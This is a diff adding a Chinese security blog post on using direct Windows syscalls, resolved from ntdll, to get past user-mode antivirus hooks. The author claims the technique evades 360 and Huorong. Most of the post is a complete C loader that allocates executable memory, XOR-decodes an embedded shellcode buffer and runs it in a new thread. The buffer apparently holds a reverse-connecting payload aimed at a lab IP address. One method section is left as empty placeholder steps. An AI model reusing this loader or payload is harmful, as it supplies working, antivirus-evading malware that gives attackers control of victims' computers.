class="line">	&#125;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上添加asm的代码也可以这样写，将asm中的代码改写放在以下形式main.cpp中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;syscall.asm</span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] &#x3D; &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   &#x2F;&#x2F;mov r10,rcx</span><br><span class="line">	0xb8,0x76,0x00,0x00,0x00, &#x2F;&#x2F;mov eax,076h</span><br><span class="line">	0x0f,0x05,   &#x2F;&#x2F;syscall</span><br><span class="line">	0xc3   &#x2F;&#x2F;ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] &#x3D; &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   &#x2F;&#x2F;mov r10,rcx</span><br><span class="line">	0xb8,0x3a,0x00,0x00,0x00, &#x2F;&#x2F;mov eax,03Ah</span><br><span class="line">	0x0f,0x05,   &#x2F;&#x2F;syscall</span><br><span class="line">	0xc3   &#x2F;&#x2F;ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] &#x3D; &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   &#x2F;&#x2F;mov r10,rcx</span><br><span class="line">	0xb8,0xc1,0x00,0x00,0x00, &#x2F;&#x2F;mov eax,0C1h</span><br><span class="line">	0x0f,0x05,   &#x2F;&#x2F;syscall</span><br><span class="line">	0xc3   &#x2F;&#x2F;ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过该方法 重新R3层API 杀软(用户态)就无法监控我们使用的API函数从而去bypass<br>动态静态可过360、火绒 （2022.11.26）<br><img src="/posts/b3138fd/7.png"><br><img src="/posts/b3138fd/8.png"></p>
+<h4 id="动态获取系统调用号"><a href="#动态获取系统调用号" class="headerlink" title="动态获取系统调用号"></a>动态获取系统调用号</h4><p>对于不同的系统版本，进入内核的系统调用号都大不相同<br>所以前面手动去找函数的系统调用号的方法存在兼容性问题，需要对不同的系统做不同的处理。在网上找了些以往的一些师傅们的文章，学习一下使用动态获取系统调用号。</p>
+<h5 id="1-动态读取ntdll-dll中的函数-获取函数调用号"><a href="#1-动态读取ntdll-dll中的函数-获取函数调用号" class="headerlink" title="1.动态读取ntdll.dll中的函数 获取函数调用号"></a>1.动态读取ntdll.dll中的函数 获取函数调用号</h5><p>流程:</p>
+<ul>
+<li><ol>
+<li>通过GetProcAddress获取ntdll中的NtReadVirtualMemory 函数地址</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>读取函数偏移0x04 获取系统调用号</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>编写函数调用模板并填入系统调用号</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>编写函数指针调用函数模板<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置动态获取ntdll中的函数系统调用号</span></span><br><span class="line"><span class="function">VOID <span class="title">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> </span>&#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;   </span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		<span class="comment">//读取的基地址指向0xb8的地址</span></span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); </span><br><span class="line">		<span class="comment">//从0xb8开始读取2个字节</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="comment">//复制2个字节到数组</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//.data段可执行</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数模板</span></span><br><span class="line">CHAR FuncExample[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span>   <span class="comment">//ret</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//初始化下 （写的有些丑陋了...）</span></span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ HANDLE Process,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ SIZE_T* RegionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG AllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG PageProtection,</span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG ParameterCount</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	PVOID BaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	PVOID Buffer,</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG BufferLength,</span></span></span><br><span class="line"><span class="function"><span class="params">	PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID pUnkown</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置获取函数的系统调用号</span></span><br><span class="line"><span class="function">VOID <span class="title">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> </span>&#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); <span class="comment">//读取的基地址指向0xb8的地址</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);<span class="comment">//从0xb8开始读取2个字节</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);<span class="comment">//复制2个字节到数组</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//异或后的shellcode</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	  </span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtAllocateVirtualMemoryEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtAllocateVirtualMemoryExProc,FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtWriteVirtualMemoryProc, FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtCreateThreadExProc, FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//返回非0</span></span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="2-通过dll导出表的方式直接Syscall"><a href="#2-通过dll导出表的方式直接Syscall" class="headerlink" title="2.通过dll导出表的方式直接Syscall"></a>2.通过dll导出表的方式直接Syscall</h5><p>流程:</p>
+<ul>
+<li>1.</li>
+<li>2.</li>
+<li>3.</li>
+<li>4.</li>
+</ul>
+<hr>
+<p>参考🍊神的文章 <a target="_blank" rel="noopener" href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a></p>
+<h4 id="Syscall项目"><a href="#Syscall项目" class="headerlink" title="Syscall项目"></a>Syscall项目</h4><h4 id="Syscall检测"><a href="#Syscall检测" class="headerlink" title="Syscall检测"></a>Syscall检测</h4><h4 id="Referernces"><a href="#Referernces" class="headerlink" title="Referernces"></a>Referernces</h4><p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav</a><br><a target="_blank" rel="noopener" href="https://myzxcg.com/2022/01/Windows-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2022/01/Windows-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-223023.htm">https://bbs.pediy.com/thread-223023.htm</a><br><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/dynamic-get-syscallid">https://idiotc4t.com/defense-evasion/dynamic-get-syscallid</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1470904">https://cloud.tencent.com/developer/article/1470904</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1014">https://forum.butian.net/share/1014</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Bypass/" rel="tag"></i><i class="fa fa-tag"></i> Bypass</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/3497b4c5/" rel="prev" title="代码混淆">
+      <i class="fa fa-chevron-left"></i> 代码混淆
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/dabd444/" rel="next" title="ntdll脱钩">
+      ntdll脱钩 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
